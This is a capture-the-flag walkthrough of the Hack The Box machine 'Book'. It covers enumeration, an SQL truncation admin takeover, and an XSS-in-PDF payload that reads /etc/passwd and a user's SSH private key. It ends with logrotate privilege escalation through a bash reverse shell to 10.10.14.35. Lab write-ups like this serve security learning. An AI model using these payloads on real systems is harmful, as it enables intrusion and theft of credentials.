---
title: "Hack The Box - Book "
date: "Jul 10 2020"
subject: "Hack The Box - Book"
keywords: [Book, Hack The Box]
subtitle: "Book walkthrough"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Hack The Box Cache Walktrough

### Information about the box 

IP address: 10.10.10.176

OS: Linux 

Difficulty: Medium 

Release: Feb 22 2020

## Introduction

Book is a medium-rated machine on HacktheBox. Even though it is considered a medium rated machine, it is a relatively easy box that introduces concepts of virtual host, SQL Truncation and exploiting the vulnerable version of logrotate.

## Summary
To obtain the user flag, virtual host has to be set to access the other website. SQL Truncation was used to takeover the admin account in a web application. XSS was then used to read local files, including a SSH private key which yielded a stable shell. Finally a vulnerable version of logrotate was exploited to escalate privileges to root.

## Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.176      | **TCP**: 22,80


### Nmap Scan Results
Nmap scan is used to determined the ports that are open in the machine. 
```command: nmap -p- -A 10.10.10.176```<br>
 Explanation of the flags used: 
* -p-: scan ports from 1 through 65535 
* -A : Enable OS detection, version detection, script scanning, and traceroute
<br>The output of the scan:   
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 10:44 +08
Stats: 0:30:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 92.02% done; ETC: 11:17 (0:02:36 remaining)
Nmap scan report for 10.10.10.176
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LIBRARY - Read | Learn | Have Fun
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/17%OT=22%CT=1%CU=31107%PV=Y%DS=2%DC=T%G=Y%TM=5F1118E
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   223.82 ms 10.10.14.1
2   226.76 ms 10.10.10.176

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2117.69 seconds
```
Based on the nmap, port 22 and port 80 is open.

### Webpage
Since port 80 is open, let's browse the webpage.
![index.html](https://github.com/mashmllo/hack-the-box--book/blob/master/img/webpage.jpg)

#### Signing up
A login page is found and users are able to sign up for an account. Thus an account is created to look around in the webpage.  

#### Collections tab 
In the collections tab, users are able to upload an image. However, there is not indication of where the image is uploaded to or if the image is even uploaded. 

#### Contact us tab 
In the contact us tab, the admin's email address is found.

##### SQL truncation
After some research, [an article](https://resources.infosecinstitute.com/sql-truncation-attack/#gref) provides details about SQL truncation attack. By creating an account using the username 'admin' and making sure that the email is more than 20 characters long starting with 'admin@book.htb',  the admin user is created. <br>
Request from burp:
```
POST /index.php HTTP/1.1

Host: 10.10.10.176

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://10.10.10.176/index.php

Content-Type: application/x-www-form-urlencoded

Content-Length: 57

Connection: close

Cookie: PHPSESSID=q7bqg1gipvobq3ict7k46un8rs

Upgrade-Insecure-Requests: 1



name=admin      a&email=admin%40book.htb      a&password=admin
```
#### Runnning dirbuster 
Dirbuster is used to identify other directory. ```/admin``` directory is found. 
```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Fri Jul 17 12:38:24 SGT 2020
--------------------------------

http://10.10.10.176:80
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/
/admin/
```

#### /admin 
When /admin site is visited, the admin account created is then used to login to the admin webpage. 
![admin page](https://github.com/mashmllo/hack-the-box--book/blob/master/img/admin%20login%20.jpg)
 
###### Collections tab  
In the collections tab, there are 2 pdf files, users and collections. By downloading the file, it is shown that the files contain tables of users and book collection. 

###### XSS in pdf
By searching 'html to pdf', [an article](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html) provides details on how to inject XSS into PDF file. Using the article, the script is copied into the textbox to read the ```/etc/passwd``` file. 
```Command: <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script> ```
When the file is being downloaded and viewed, the pdf file is rewritten into the content of ```/etc/passwd```. 

## Preperation
### Obtaining SSH key of user
By changing the location to the ssh key of the user, we are able to login as the user through ssh. 
```
command: <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script> 
```
### Making the key into a valid format
Once the key have been retrieved, the ssh key is not in a valid format, thus the following commands are issured to allow us to login as reader:
```
changing the key into a valid format: gs -sDEVICE=txtwrite -o - rsa_key.pdf
changing the permission of the key: chmod 600 rsa_key.txt 
```
## Gettting User Flag

### User Flag
Use the ssh key to login as reader to retrieve the flag. 
```
command to login using rsa key: ssh -i rsa_key.txt reader@10.10.10.176
command to retrieve user flag: cat /home/reader/user.txt
```
Ouput: <br>
![flag](https://github.com/mashmllo/hack-the-box--book/blob/master/img/user%20flag.jpg)

## Privilege Escalation

### Enumeration
By running [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite),logrotate is found to be writable. 
![logrotate linpeas](https://github.com/mashmllo/hack-the-box--book/blob/master/img/priv%20es.jpg)

### Logrotten 
A exploit for logrotate is found in [github](https://github.com/whotwagner/logrotten). The file is downloaded and transferred to the target machine. 
```
command to setup a web server: python -m SimpleHTTPServer 8080
command to retrieve the script from host machine: wget http://10.10.14.35:8080/logrotten
```

Based on the guides in the github repository, a payload is also required. Thus a bash shell is also created as the payload
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.35/4444 0>&1
```

The script is then transferred to the target machine and netcat is set up on the host machine. 
```
command to setup a web server: python -m SimpleHTTPServer 8080
command to run logrotten: cp ~/backups/access.log.1 ~/backups/access.log; ./logrotten -p bashs.sh /home/reader/backups/access.log
command to start netcat: nc -nvlp 4444
```
Explanation of the flags used:
-n : Do not do any DNS or service lookups on any specified addresses, hostnames or ports.
-v : Have nc give more verbose output.
-l : Used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host
-p : Specifies the source port nc should use, subject to privilege restrictions and availability

## Root Flag 

```cat /root/root.txt``` to get the root flag <br>
![flag](https://github.com/mashmllo/hack-the-box--book/blob/master/img/root.jpg)
